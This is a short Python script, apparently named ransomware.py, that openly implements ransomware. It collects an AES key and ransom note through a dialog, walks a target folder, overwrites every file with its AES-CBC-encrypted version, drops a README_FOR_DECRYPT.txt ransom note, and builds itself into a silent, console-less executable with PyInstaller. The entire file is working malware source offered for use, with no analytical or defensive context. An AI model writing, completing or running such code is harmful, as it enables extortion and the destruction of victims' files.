import os
import base64
import hashlib
import sys
import tkinter as tk
from tkinter import simpledialog
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from PyInstaller.__main__ import run

# GUI to get user-defined encryption key and ransom note
def get_user_inputs():
    root = tk.Tk()
    root.withdraw()
    key_input = simpledialog.askstring("Input", "Enter a 32-character encryption key:")
    note_input = simpledialog.askstring("Input", "Enter ransom note:")
    if len(key_input) != 32:
        raise ValueError("Key must be exactly 32 characters.")
    return key_input.encode(), note_input

# Pad data to be AES block size compatible
def pad(data):
    return data + b" " * (AES.block_size - len(data) % AES.block_size)

# Encrypt files with AES-256
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(plaintext))
    with open(file_path, 'wb') as f:
        f.write(cipher.iv + ciphertext)

# Display ransom note
def ransom_note(note):
    with open("README_FOR_DECRYPT.txt", "w") as f:
        f.write(note)

# Encrypt all files in directory
def encrypt_directory(directory, key, note):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
    ransom_note(note)

# Generate EXE file
def generate_exe():
    run(["--onefile", "--noconsole", "ransomware.py"])

# Execute ransomware
if __name__ == "__main__":
    key, note = get_user_inputs()
    target_directory = "./target_folder"  # Change to target directory
    encrypt_directory(target_directory, key, note)
    generate_exe()
